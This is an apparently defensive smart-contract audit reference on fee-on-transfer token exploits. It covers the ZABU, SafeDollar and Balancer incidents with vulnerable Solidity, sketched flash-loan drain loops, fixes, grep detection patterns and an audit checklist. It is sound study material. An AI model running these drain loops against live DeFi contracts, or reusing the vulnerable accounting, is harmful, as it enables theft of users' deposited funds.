---
protocol: generic
chain: ethereum, bsc, avalanche
category: fee_on_transfer
vulnerability_type: deflationary_token_incompatibility

attack_type: repeated_deposit_drain
affected_component: farm_staking, amm_pool, token_balance

primitives:
  - deflationary_token
  - fee_on_transfer
  - balance_divergence
  - repeated_deposit_withdraw
  - gulp_sync

severity: critical
impact: fund_loss
exploitability: 0.85
financial_impact: high

tags:
  - deflationary
  - fee_on_transfer
  - rebasing
  - farm_drain
  - balance_divergence
  - gulp
  - loop_attack
  - real_exploit
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 3
total_losses: "$5M+"
---

## DeFiHackLabs Deflationary Token Incompatibility Compendium

### Overview

Deflationary (fee-on-transfer) tokens burn or tax a percentage on every transfer. When protocols assume `transferFrom(amount)` credits exactly `amount`, they create exploitable gaps between recorded balances and actual balances. This entry catalogs **3 real-world exploits** from 2019-2021 demonstrating how this mismatch enables complete fund drainage.

### Root Cause Categories

1. **Farm Drain Loop** — Deposit records `amount` but only `amount - fee` arrives → repeated deposit/withdraw spirals drain farm
2. **AMM Pool Balance Divergence** — Pool's internal balance diverges from actual `balanceOf()` → attacker uses `gulp()` to sync and steal the gap

---

### Vulnerable Pattern Examples

#### Category 1: Farm Drain Loop — Repeated Deposit/Withdraw [CRITICAL]

**Example 1: ZABU Finance — SPORE Deflationary Farm Drain ($3.2M, 2021-09)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Farm credits `amount` deposited, not actual tokens received
// SPORE token burns 1% on every transfer

contract VulnerableFarm {
    mapping(address => uint256) public userBalance;

    function deposit(uint256 amount) external {
        // @audit Records `amount` but only receives `amount * 0.99` due to SPORE burn
        IERC20(stakingToken).transferFrom(msg.sender, address(this), amount);
        userBalance[msg.sender] += amount;  // @audit Credits full amount!
    }

    function withdraw(uint256 amount) external {
        require(userBalance[msg.sender] >= amount, "insufficient");
        userBalance[msg.sender] -= amount;
        IERC20(stakingToken).transfer(msg.sender, amount);
        // @audit Sends `amount` but user deposited less due to fee
    }
}

// Attack: Flash loan SPORE → Deposit/Withdraw loop
function exploit() external {
    uint256 flashAmount = 100_000 ether;
    // Flash borrow SPORE tokens

    // Each cycle: deposit(X) credits X but farm receives 0.99X
    // withdraw(X) sends full X from farm balance
    // Net extraction: 0.01X per cycle from other users' deposits

    for (uint256 i = 0; i < 100; i++) {
        uint256 bal = SPORE.balanceOf(address(this));
        farm.deposit(bal);
        farm.withdraw(bal);  // @audit Extracts 1% of farm balance per loop
    }
    // @audit After 100 loops: farm is almost completely drained
    // Repay flash loan with massive profit
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-09/ZABU_exp.sol`
- **Root Cause**: ZABU Finance farm used `amount` parameter for accounting instead of measuring actual tokens received (`balanceAfter - balanceBefore`). SPORE's 1% burn per transfer meant each deposit credited more than received, and each withdrawal sent more than owed. Loop extracts the gap.

**Example 2: SafeDollar — PLX Token Drain Loop ($248K, 2021-06)** [HIGH]
```solidity
// ❌ VULNERABLE: Same pattern — farm doesn't account for PLX transfer fee

// PLX token implementation:
contract PLXToken {
    uint256 public taxFee = 5;  // @audit 5% fee on every transfer

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 fee = amount * taxFee / 100;
        uint256 transferAmount = amount - fee;
        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;  // @audit Recipient gets 95%
        _balances[feeRecipient] += fee;           // @audit 5% goes to fee holder
    }
}

// SafeDollar Farm:
contract SDORewardPool {
    function deposit(uint256 _pid, uint256 _amount) public {
        // @audit Credits _amount but only _amount * 0.95 arrives
        stakingToken.safeTransferFrom(msg.sender, address(this), _amount);
        user.amount += _amount;  // @audit WRONG: should measure actual received
    }
}

// Attack loop: Flash loan PLX → deposit/withdraw cycle
// 5% burn means much faster drain than SPORE's 1%
for (uint256 i = 0; i < loopCount; i++) {
    farm.deposit(poolId, PLX.balanceOf(address(this)));
    farm.withdraw(poolId, userInfo.amount);
    // @audit Each cycle extracts ~5% of remaining farm PLX balance
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-06/SafeDollar_exp.sol`
- **Root Cause**: Identical to ZABU — farm records `_amount` parameter instead of actual received amount. With PLX's 5% fee, the drain is 5x faster per cycle.

---

#### Category 2: AMM Pool Balance Divergence [HIGH]

**Example 3: Balancer + STA Token — Pool Balance Drift + gulp() ($500K, 2020-06)** [HIGH]
```solidity
// ❌ VULNERABLE: Balancer pool tracks internal `records[token].balance`
// STA token burns 1% per transfer → internal balance > actual balanceOf()

contract BalancerPool {
    struct Record {
        uint256 balance;    // @audit Internal tracked balance
        uint256 denorm;     // Weight
    }
    mapping(address => Record) public records;

    function swapExactAmountIn(
        address tokenIn, uint256 tokenAmountIn,
        address tokenOut, uint256 minAmountOut
    ) external {
        Record storage inRecord = records[tokenIn];
        Record storage outRecord = records[tokenOut];

        // @audit Internal balance used for swap math
        uint256 spotPrice = calcSpotPrice(
            inRecord.balance, inRecord.denorm,
            outRecord.balance, outRecord.denorm
        );

        // Transfer tokens
        IERC20(tokenIn).transferFrom(msg.sender, address(this), tokenAmountIn);
        inRecord.balance += tokenAmountIn;  // @audit Credits FULL amount
        // But STA only transferred tokenAmountIn * 0.99 actual tokens!
        // Over many swaps: inRecord.balance >> actual balanceOf(STA)
    }

    // @audit gulp() syncs internal balance with actual balanceOf()
    function gulp(address token) external {
        records[token].balance = IERC20(token).balanceOf(address(this));
        // @audit After many swaps: balance drops dramatically
        // This enables the attacker to buy STA "cheap" (pool thinks it has more)
    }
}

// Attack:
// 1. Perform many STA swaps → internal balance inflated vs actual
// 2. Call gulp(STA) → internal balance crashes to actual (much lower)
// 3. Pool now thinks STA is very scarce → STA price spikes
// 4. Sell STA back to pool at inflated price → extract other tokens (WETH)

// Advanced: Repeat until STA balance approaches 0
// When STA balance ≈ 1 wei, the pool's swap math produces
// extreme output amounts due to division by near-zero
flash_loan_WETH();
for (uint i = 0; i < 24; i++) {
    // Swap WETH → STA (reduces STA in pool to near-zero)
    pool.swapExactAmountIn(WETH, amount, STA, 0);
    pool.gulp(STA);  // @audit Sync reveals depleted balance
}
// STA balance ≈ 1 → borrow WETH at extreme rate
pool.swapExactAmountIn(STA, 1, WETH, pool_WETH_balance);
// @audit Drains ALL WETH from pool for 1 STA token
```
- **PoC**: `DeFiHackLabs/src/test/2020-06/Balancer_exp.sol`
- **Root Cause**: Balancer's internal accounting (`records[token].balance`) diverged from actual `balanceOf()` because STA burned 1% per transfer. The `gulp()` function synced this, but the attacker used the sync to manipulate apparent scarcity of STA, extracting WETH at extreme rates.

---

### Impact Analysis

#### Technical Impact
- **Complete farm drainage**: Loop attacks can drain 100% of farm deposits
- **Price manipulation via balance tracking**: AMM internal/external balance divergence enables price manipulation
- **Cascading failures**: Deflationary tokens affect any protocol that doesn't account for fees

#### Business Impact
| Protocol | Loss | Deflationary Token | Fee Rate |
|----------|------|--------------------|----------|
| ZABU Finance | $3.2M | SPORE | 1% per transfer |
| SafeDollar | $248K | PLX | 5% per transfer |
| Balancer | ~$500K | STA | 1% per transfer |

---

### Secure Implementation

**Fix 1: Measure Actual Tokens Received**
```solidity
// ✅ SECURE: Check balance before and after transfer
function deposit(uint256 amount) external {
    uint256 balBefore = stakingToken.balanceOf(address(this));
    stakingToken.safeTransferFrom(msg.sender, address(this), amount);
    uint256 balAfter = stakingToken.balanceOf(address(this));
    uint256 actualReceived = balAfter - balBefore;
    // @audit Credit only what was ACTUALLY received
    userBalance[msg.sender] += actualReceived;
}
```

**Fix 2: Block Deflationary Tokens in AMMs**
```solidity
// ✅ SECURE: Validate no transfer fee exists before allowing token in pool
function bind(address token, uint256 balance, uint256 denorm) external {
    uint256 balBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).transferFrom(msg.sender, address(this), balance);
    uint256 balAfter = IERC20(token).balanceOf(address(this));
    // @audit Reject tokens where received != sent
    require(balAfter - balBefore == balance, "deflationary tokens not supported");

    records[token] = Record({balance: balance, denorm: denorm});
}
```

**Fix 3: Per-Transfer Balance Sync in AMM**
```solidity
// ✅ SECURE: Sync internal balance on every swap (UniswapV2 pattern)
function swap(address tokenIn, uint256 amountIn, address tokenOut) external {
    IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);

    // @audit Calculate output using reserves, then sync actual balance
    uint256 actualIn = IERC20(tokenIn).balanceOf(address(this)) - reserve[tokenIn];
    uint256 amountOut = getAmountOut(actualIn, reserve[tokenIn], reserve[tokenOut]);

    IERC20(tokenOut).transfer(msg.sender, amountOut);

    // @audit Update reserves to actual balances after every operation
    reserve[tokenIn] = IERC20(tokenIn).balanceOf(address(this));
    reserve[tokenOut] = IERC20(tokenOut).balanceOf(address(this));
}
```

---

### Detection Patterns

```bash
# Farm deposits that don't measure actual received
grep -rn "function deposit\|function stake" --include="*.sol" | \
  xargs grep -A 5 "transferFrom" | \
  grep -L "balanceBefore\|balanceOf.*before\|actualReceived"

# AMM pools with internal balance tracking + gulp
grep -rn "function gulp\|\.balance\s*=" --include="*.sol" | \
  grep -i "pool\|balancer\|amm"

# Token implementations with transfer fees
grep -rn "function _transfer\|function transfer" --include="*.sol" | \
  xargs grep -B 5 -A 15 "fee\|tax\|burn\|deflat"

# Accounting that uses amount parameter instead of measured difference
grep -rn "user.*amount\s*+=\s*_amount\|userInfo.*amount\s*+=\s*amount" --include="*.sol"
```

---

### Audit Checklist

1. **Does the protocol support fee-on-transfer tokens?** — If yes, does it measure `balanceAfter - balanceBefore`?
2. **Are deposit amounts recorded from the parameter or from actual received tokens?**
3. **Is there a `gulp()` or `sync()` function?** — If so, can it be exploited for price manipulation?
4. **Do internal accounting records track `balanceOf()` or a separate variable?** — Separate variables diverge with deflationary tokens
5. **Can deposit/withdraw be called in a loop (no cooldown)?** — Enables rapid farm drain
6. **Does the AMM validate token compatibility before allowing listing?**

---

### Keywords

- deflationary_token
- fee_on_transfer
- balance_divergence
- farm_drain
- loop_attack
- gulp
- deposit_withdraw_loop
- transfer_tax
- rebasing_token
- actual_received
- balance_before_after
- DeFiHackLabs

---

### Related Vulnerabilities

- [Fee-on-Transfer Token Issues](../../general/fee-on-transfer-tokens/fee-on-transfer-token-vulnerabilities.md)
- [Token Compatibility](../../general/token-compatibility/token-compatibility-vulnerabilities.md)
- [Vault Inflation Attack](../../general/vault-inflation-attack/vault-inflation-attack.md)
